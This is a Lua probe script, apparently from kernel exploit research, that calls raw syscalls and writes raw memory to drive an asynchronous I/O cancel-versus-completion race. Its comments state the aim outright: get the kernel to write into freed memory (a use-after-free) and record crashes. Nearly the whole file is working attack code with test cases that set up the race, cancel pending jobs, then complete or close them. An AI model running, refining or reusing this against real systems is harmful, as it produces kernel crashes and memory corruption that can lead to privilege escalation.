-- CRASH_CLASS: HIGH
-- PROBE 776a: cancel a pending aio job, then let it complete
--
-- 743a showed a pending object cannot be deleted (state gate 0x80020010).
-- 666 cancel is not gated by that check, so it can reach a job the worker
-- still holds. If cancel releases the job while the blocked read is still
-- queued on the socket, completion writes into freed memory. Classic
-- cancel-vs-completion UAF, never tested here.
print("=== PROBE 776a: AIO CANCEL IN FLIGHT ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=to_num(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "DEAD" end
    return to_num(r)
end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return to_num(v) end end
local function rdq(a) local o,v=pcall(function() return memory.read_qword(a) end) if o then return v end end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-8,8 do memory.write_qword(a+i,0) end end) end
local D=to_num(memory.alloc(0x400)); local buf=to_num(memory.alloc(0x1000))
local res=to_num(memory.alloc(0x100)); local ids=to_num(memory.alloc(0x40))
local st=to_num(memory.alloc(0x40)); local fds=to_num(memory.alloc(0x20))
local function pair()
    zero(fds,0x20); wd(fds,0xFFFF); wd(fds+4,0xFFFF)
    call(mk(135),1,1,0,fds,0,0)
    local s0,s1=rd(fds),rd(fds+4)
    if type(s0)~="number" or s0<=0 or s0==0xFFFF then return nil end
    return s0,s1
end
local function create(fd,len,bufp,resp)
    zero(D,0x400); zero(st,0x40)
    wq(D+0x00,0); wq(D+0x08,len); wq(D+0x10,bufp); wq(D+0x18,resp)
    wd(D+0x20,fd); wd(D+0x24,0)
    local r=call(mk(669),0x1001,D,1,1,st,0)
    return r, rd(st)
end
local function poll(id)
    zero(res,0x100); wd(ids,id)
    local r=call(mk(664),ids,1,res,0,0,0)
    return r, rd(res)
end
local function del(id)
    zero(res,0x100); wd(ids,id)
    local r=call(mk(662),ids,1,res,0,0,0)
    return r, rd(res)
end
local function cancel(id)
    zero(res,0x100); wd(ids,id)
    local r=call(mk(666),ids,1,res,0,0,0)
    return r, rd(res)
end
-- [B] control: cancel a completed object, then delete (766a repeat, cheap)
local a0,a1=pair()
zero(buf,0x1000)
local r0,id0=create(a0,16,buf,res)
local w0=call(mk(4),a1,buf,U(16),0,0,0)
local pb,sb=poll(id0)
print(string.format("[B] control create=%s id=%08X write=%s state=%08X",tostring(r0),id0 or 0,tostring(w0),sb))
-- [A] cancel a pending job, then complete it
local s0,s1=pair()
zero(buf,0x1000)
local r1,id1=create(s0,16,buf,res)
local pa,sa=poll(id1)
print(string.format("[A] create=%s id=%08X state=%08X (want 2)",tostring(r1),id1 or 0,sa))
local ca,caout=cancel(id1)
print(string.format("[A] cancel ret=%s out=%08X",tostring(ca),caout))
local pc,sc=poll(id1)
print(string.format("[A] poll after cancel state=%08X",sc))
print(string.format("[A] write peer=%s",tostring(call(mk(4),s1,buf,U(16),0,0,0))))
local pd,sd=poll(id1)
local dd,dds=del(id1)
print(string.format("[A] poll after write state=%08X del=%s delst=%08X alive=%s",sd,tostring(dd),dds,tostring(call(mk(20),0,0,0,0,0,0))))
-- [C] cancel a pending job whose peer never writes, then close
local t0,t1=pair()
zero(buf,0x1000)
local r2,id2=create(t0,16,buf,res)
local pe,se=poll(id2)
local ce,ceo=cancel(id2)
print(string.format("[C] create=%s id=%08X state=%08X cancel=%s out=%08X",tostring(r2),id2 or 0,se,tostring(ce),ceo))
print(string.format("[C] close both %s %s",tostring(call(mk(6),t0,0,0,0,0,0)),tostring(call(mk(6),t1,0,0,0,0,0))))
local pf,sf=poll(id2)
local df,dfs=del(id2)
print(string.format("[C] poll=%08X del=%s delst=%08X alive=%s",sf,tostring(df),dfs,tostring(call(mk(20),0,0,0,0,0,0))))
print("=== 776a DONE ===")
